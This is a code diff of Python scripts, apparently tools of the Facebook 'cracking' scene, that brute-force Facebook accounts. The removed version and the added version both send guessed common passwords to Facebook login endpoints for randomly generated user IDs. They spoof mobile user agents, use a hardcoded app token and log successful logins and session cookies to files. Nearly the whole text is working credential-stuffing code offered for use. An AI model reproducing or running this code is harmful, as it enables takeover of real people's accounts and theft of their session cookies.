-    sys.stdout.write(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;97m[\x1b[10;92mTutul\x1b[10;97m-\x1b[10;92mM1\x1b[10;97m]>~[\x1b[10;92m{lop}\x1b[10;97m]>~<[\x1b[10;92m{tid}\x1b[10;97m]>~[\x1b[10;92mOK\x1b[10;91m•\x1b[10;92m%s\x1b[10;91m/\x1b[10;93m%s\x1b[10;97m] ''' % (len(ok), len(lk)));sys.stdout.flush()
-    for psw in psd:
-        vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
-        VAPP = random.randint(410000000, 499999999)
-        gtt = random.choice(xxxxx)
-        gttt = random.choice(xxxxx)
-        ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + '[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{density=3.3,width=1080,height=1430};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
-        datax = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': id, 'password': psw, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'en_GB': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
-        header = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
-        twfx = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
-        lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False).json()
-        if 'session_key' in lo:
-            cki = lo['session_cookies']
-            ck = {}
-            for xk in cki:
-                ck.update({xk['name']: xk['value']})
-            coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
-            iid = re.findall('c_user=(.*);xs', coki)[0]
-            print(f'''\r\r\x1b[10;92m[Tutul-Ok💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{tutulx(iid)}''')
-            os.system('espeak -a 300 "Tutul,  Ok,  id"')
-            ok.append(id)
-            open('/sdcard/1T-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
-            if 'y' in cokix:
-                print(f'''\r\r\x1b[10;93m[🌺] \x1b[10;91m= \x1b[10;93mCOOKIES\x1b[10;91m •  \x1b[10;94m{coki}{E}''')
-                print(f'''\x1b[10;97m{'==============================================='}{E}''')
-            break
-        else:
-            if twfx in str(lo):
-                iid = lo['error']['error_data']['uid']
-                print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;96m[Tutul-2F] {iid} | {psw}{W}''')
-                os.system('espeak -a 300 \"2F\"')
-                open('/sdcard/1T-2F.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
-                twf.append(id)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+AUTHOR   : AR RAHIM 
+GITHUB   : Rahim2034/Rahim-King
+Ex GF    : Bithi 🐥 Rotna❤️      
+VERSION  : 11.5.8
+\x1b[1;92mLOGO KA KYA H UNKA TO KAM H HI JALNA
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+""")
+#----------------------------[MAIN/DEF]-----------------------------------#
+def main(): 
+    user = []
+    os.system("clear")
+    print(logo)
+    print(f'{g}<{r}/{g}>{w} EXAMPLE   {r}: {w}10000 {g}| {w}20000 {g}| {w}90000')
+    lin()
+    limit = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
+    lin()
+    print(f"{g}[{r}1{g}] {w}SERVER {r}~ {g}[{w}2011{r}-{w}2014{g}]")
+    print(f"{g}[{r}2{g}] {w}SERVER {r}~ {g}[{w}2009{r}-{w}2010{g}]")
+    lin()
+    ask = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
+    lin()
+    print(f"{g}[{r}1{g}] {w}METHOD {r}[{g}A{r}]")
+    print(f"{g}[{r}2{g}] {w}METHOD {r}[{g}B{r}]{g}")
+    lin()
+    mtd_opt = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
+    lin()
+    print(f"{g}[{r}1{g}] {w} CRACK SPEED {r}[{g}HIGH{r}]")
+    print(f"{g}[{r}2{g}] {w} CRACK SPEED {r}[{g}NORMAL{r}]{g}")
+    lin()
+    cspd = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
+    if "1" in cspd:
+        speedx = 45
+    else:
+        speedx = 30
+        
+    if ask in ["1"]:
+        sv = f"{g}[{w}2011{r}-{w}2014{g}]"
+        star = "10000"
+        for i in range(int(limit)):
+            data = str(random.choice(range(1000000000, 9999999999)))
+            user.append(data)
+    else:
+        sv = f"{g}[{w}2009{r}-{w}2010{g}]"
+        star = "100000"
+        for i in range(int(limit)):
+            data = str(random.choice(range(100000000, 999999999)))
+            user.append(data)
+    
+    with ThreadPool(max_workers=speedx) as samira:
+        tl = str(limit)
+        os.system('clear')
+        print(logo)
+        print(f'{g}[{r}~{g}] {w}TOTAL ID {r}: {p}{limit} {g}[{r}~{g}] {w}SERVER {r}: {sv}')
+        print(f'{g}[{r}~{g}] {w}IF NO RESULT {g}[{w}ON{r}/{w}OFF{g}]{w} AIRPLANE MODE{g}')
+        lin()
+        for mal in user:
+            uid = star + mal
+            if mtd_opt in ["1", "A"]:
+                samira.submit(login, uid, tl)
+            elif mtd_opt in ["2", "B"]:
+                samira.submit(login1, uid, tl)
+            else:
+                samira.submit(login, uid, tl)
+    print("")
+    lin()
+    print(f"{g}[{r}~{g}] {w}CRACK PROCESSED COMPLETED")
+    print(f"{g}[{r}~{g}] {w}TOTAL OK ID : {g}{str(len(oks))}")
+    lin()
+    input(f"{g}[{r}~{g}] {w}PRESS ENTER TO EXIT")
+    sys.exit()
+#----------------------------[METHOD 1]-----------------------------------#
+def login(uid, tl):
+    global oks, loop
+    try:
+        ua_list = arnold_all()
+        sys.stdout.write(f"\r➤ {g}ARNOLD{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
+        sys.stdout.flush()
+        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
+            chosen_ua = arnold_all()
+            headers = {
+                'x-fb-connection-bandwidth': str(random.randint(20000000, 40000000)),
+                'x-fb-sim-hni': str(random.randint(20000, 40000)),
+                'x-fb-net-hni': str(random.randint(20000, 40000)),
+                'x-fb-connection-quality': 'EXCELLENT',
+                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+                'user-agent': ua_list,
+                'content-type': 'application/x-www-form-urlencoded',
+                'x-fb-http-engine': 'Liger'
+            }
+            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
+                   str(uid) + '&password=' + str(pw) + 
+                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
+                   '&error_detail_type=button_with_disabled&source=device_based_login' +
+                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
+                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
+                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
+                   '&fb_api_req_friendly_name=authenticate&cpl=true')
+            rp = requests.get(url, headers=headers).json()
+            if "session_key" in rp:
+                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
+                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+                oks.append(uid)
                 break
-            if 'www.facebook.com' in lo['error']['message']:
-                iid = lo['error']['error_data']['uid']
-                if iid in ok:pass
-                if 'y' in cpx:
-                    print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;93m[Tutul-Cp] {iid} | {psw}{W}''')
-                    cp.append(id)
-                    os.system('espeak -a 300 "Cp"')
-                    open('/sdcard/1T-CP.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
+            elif "Please Confirm Email" in str(rp):
+                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
+                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+                oks.append(uid)
                 break
-            else:pass
-    lop += 1
-#------------------[ END-CALL ]-----------------#
-Main()
-			
+            else:
+                continue
+        loop += 1
+    except requests.exceptions.ConnectionError:
+        time.sleep(30)
+    except Exception as e:
+        pass
+#----------------------------[METHOD 2]-----------------------------------#
+def login1(uid, tl):
+    global oks, loop
+    try:
+        sys.stdout.write(f"\r➤ARNOLD{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
+        sys.stdout.flush()
+        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
+
+            url = 'https://graph.facebook.com/auth/login'
+
+            ua_list2 = ua_2009_2016(100)
+            ua_list = arnold_all()
+            headers = {
+                'User-Agent': ua_list,
+                'Accept-Encoding': 'gzip, deflate',
+                'Accept': '*/*',
+                'Connection': 'close',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': str(random.randint(11111,66666)),
+                'X-FB-SIM-HNI': str(random.randint(11111,66666)),
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'X-FB-Connection-Type': 'WIFI',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
+            }
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'email': uid,
+                'password': pw,
+                'generate_analytics_claims': '1',
+                'community_id': '',
+                'cpl': 'true',
+                'try_num': '1',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'password',
+                'source': 'login',
+                'error_detail_type': 'button_with_disabled',
+                'enroll_misauth': 'false',
+                'generate_session_cookies': '1',
+                'generate_machine_id': '1',
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'fb_api_req_friendly_name': 'authenticate',
+                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            }
+            rp = requests.post(url, headers=headers, data=data).json()
+            if "session_key" in rp:
+                cookie = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
+                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
+                try:
+                    print(f"\r\r{r}[{g}COOKIES 🍪{r}]{p}➤ {w}{cookie}")
+                    lin()
+                except(KeyError, IOError):
+                    pass
+                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+                oks.append(uid)
+                break 
+            elif "Please Confirm Email" in str(rp):
+                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
+                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+                oks.append(uid)
+                break
+            else:
+                continue
+        loop += 1
+    except requests.exceptions.ConnectionError:
+        time.sleep(30)
+    except:pass
+    menu()
